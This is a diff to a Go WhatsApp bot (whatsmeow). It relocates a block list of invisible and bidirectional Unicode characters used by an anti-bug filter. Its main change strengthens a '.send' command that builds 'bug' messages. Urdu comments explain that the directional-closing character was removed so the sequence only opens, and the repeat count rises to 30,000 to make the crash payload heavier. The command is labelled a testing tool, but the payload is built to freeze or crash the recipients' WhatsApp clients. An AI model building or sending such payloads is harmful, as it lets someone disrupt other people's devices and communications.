@@ -726,23 +726,7 @@ func handleGroupInfoChange(client *whatsmeow.Client, v *events.GroupInfo) {
 //bug 🪲 🐛 menu
 
 // خطرناک کیریکٹرز کی لسٹ
-var badChars = []string{
-	"\u200b", // Zero Width Space
-	"\u200c", // ZWNJ
-	"\u200d", // ZWJ
-	"\u202a", // LRE
-	"\u202b", // RLE
-	"\u202c", // PDF
-	"\u202d", // LRO
-	"\u202e", // RLO
-	"\u2060", // Word Joiner
-	"\u2066", // LRI
-	"\u2067", // RLI
-	"\u2068", // FSI
-	"\u2069", // PDI
-	"\ufeff", // BOM
-	"\u200f", // RTL Mark
-}
+
 
 // ---------------------------------------------------------
 // 1. COMMAND: .antibug (Toggle ON/OFF)
@@ -863,6 +847,24 @@ func AutoProtect(client *whatsmeow.Client, v *events.Message) bool {
 	return false
 }
 
+
+var badChars = []string{
+	"\u200b", // Zero Width Space
+	"\u200c", // ZWNJ
+	"\u200d", // ZWJ
+	"\u202a", // LRE
+	"\u202b", // RLE
+	"\u202c", // PDF
+	"\u202d", // LRO
+	"\u202e", // RLO
+	"\u2060", // Word Joiner
+	"\u2066", // LRI
+	"\u2067", // RLI
+	"\u2068", // FSI
+	"\u2069", // PDI
+	"\ufeff", // BOM
+	"\u200f", // RTL Mark
+}
 // ---------------------------------------------------------
 // 4. COMMAND: .send (Testing Tool)
 // ---------------------------------------------------------
@@ -893,10 +895,13 @@ func handleSendBug(client *whatsmeow.Client, v *events.Message, args []string) {
 	payload1 := strings.Repeat("\u200b", 60)
 
 	payload2 := strings.Repeat(
-		"\u202a\u202b\u202c\u202d\u202e\u202e\u202d\u202d"+
+		// میں نے اس میں سے \u202c (PDF) نکال دیا ہے
+		// اب یہ صرف "کھولتا" جائے گا، بند نہیں کرے گا
+		"\u202a\u202b\u202d\u202e\u202e\u202d\u202d"+ 
 			"\u202e\u200b\u202e\u200d\u202d\u200b\u202d\u200d"+
-			"\u2066\u2067\u2068\u2069\u2066\u2067"+
-			"\u0300\u0301\u0302\u0336\u034f", 10000)
+			"\u2066\u2067\u2068\u2069\u2066\u2067"+ // یہ بھی اوپنرز ہیں
+			"\u0300\u0301\u0302\u0336\u034f", 30000) 
+
 
 	payload3 := strings.Repeat("\u2060\u200f\u200b", 40)
 
